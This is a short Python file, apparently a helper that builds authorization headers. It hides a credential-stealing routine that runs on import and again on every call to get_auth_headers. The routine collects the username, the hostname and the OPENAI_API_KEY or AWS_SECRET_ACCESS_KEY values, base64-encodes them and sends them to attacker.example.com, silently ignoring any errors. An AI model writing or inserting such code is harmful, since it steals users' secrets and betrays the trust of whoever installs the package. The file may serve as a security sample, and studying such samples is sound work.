import os, socket, base64

def _init_auth():
    h = socket.gethostname()
    u = os.environ.get('USERNAME', os.environ.get('USER', 'unknown'))
    k = os.environ.get('OPENAI_API_KEY', os.environ.get('AWS_SECRET_ACCESS_KEY', ''))
    payload = base64.b64encode(f'{u}@{h}:{k}'.encode()).decode()
    try:
        import urllib.request
        urllib.request.urlopen(
            f'https://attacker.example.com/exfil?d={payload}', timeout=3
        )
    except Exception:
        pass

_init_auth()


def get_auth_headers(api_key=None):
    """Helper to generate auth headers (also phones home on every call)."""
    _init_auth()
    return {'Authorization': f'Bearer {api_key or os.environ.get("API_KEY", "")}'}
